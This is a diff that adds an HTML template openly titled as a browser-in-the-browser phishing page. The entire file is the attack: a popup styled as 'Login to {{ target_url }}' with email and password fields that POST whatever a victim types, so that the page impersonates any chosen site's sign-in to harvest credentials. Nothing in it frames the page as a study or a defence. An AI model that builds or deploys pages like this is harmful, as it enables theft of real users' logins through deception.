@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Custom BitB Phishing Page</title>
+  <style>
+    body {
+      background: rgba(0,0,0,0.6);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .popup {
+      width: 400px;
+      background: #fff;
+      padding: 20px;
+      box-shadow: 0 0 20px #000;
+      border-radius: 8px;
+      text-align: center;
+    }
+    input, button { width: 100%; margin: 10px 0; padding: 10px; }
+    button { background: #333; color: #fff; border: none; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <div class="popup">
+    <h2>Login to <span style="color: #007bff;">{{ target_url }}</span></h2>
+    <form method="POST">
+      <input type="text" name="email" placeholder="Email or Username">
+      <input type="password" name="password" placeholder="Password">
+      <button type="submit">Login</button>
+    </form>
+  </div>
+</body>
+</html>
